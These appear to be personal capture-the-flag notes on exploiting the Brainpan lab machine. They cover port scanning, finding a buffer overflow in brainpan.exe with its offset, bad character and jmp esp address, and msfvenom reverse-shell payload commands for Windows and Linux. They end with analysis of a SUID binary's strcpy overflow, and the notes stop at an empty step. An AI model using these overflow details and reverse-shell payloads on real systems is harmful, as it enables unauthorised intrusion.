
10.10.157.116

[[1 - nmap]]
9999/tcp  open  abyss?
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)

[[2 - nc]]
nc 10.10.157.116 9999
found a bof vuln

[[3 - web n gobuster]]
gobuster
http://10.10.157.116:10000/bin                  (Status: 200) [Size: 230]
here we found brainpan.exe

[[4 - brainpan.exe in r2]]
found the password and checked out the program structure

[[5 - brainpan.exe in x32dbg]]
opened it in x32dbg and run a fuzzer script with a non repeating string
offset 524
Checking badchars: We can't find any but \x00
We found a jmp esp address at 0x311712f3

[[6 - Run an exploit for windows]]
Created a payload: `msfvenom --payload 'windows/shell_reverse_tcp' LHOST=10.21.31.111 LPORT=443 --format 'python' --bad-chars '\x00\x0a'`
Ran via python
Is this windows? Very odd quirky shell! Found wine info in the environment vars and ability to run linux executables
The first "hint" was that brainpan.exe is kept running by a bash script!
If we read more carefully we can see: `/usr/bin/wine /home/puck/web/bin/brainpan.exe &` is being run

[[7 - run an exploit for linux]]
Created a payload: `msfvenom --payload 'linux/x86/shell_reverse_tcp' LHOST=10.21.31.111 LPORT=444 --format 'python' --bad-chars '\x00'`
Ran via python and got a nice linux shell :)
We found a root sudo binary but we don't have access to it. We need to be able to access anansi's user directory.
We found a suid binary owned by anansi. Let's download it (I used nc) and check it out.
Downloaded "validate" using nc

[[8 - validate exec in ghidra]]
Ghidra gave us a simple decompiled c code
We can see that is the input string at any position contains an "F" then the loop will exit (meaning this is a bad char!).
If we reach the end of the string, going one character at a time, the full string will be copied using the vulnable strcpy() and the function returns.
The buffer we copy into is 100 characters.
I tested to send an argument with 120 characters and got a segmentation fault as expected. time for edb and python

[[9 - validate exec in edb]]



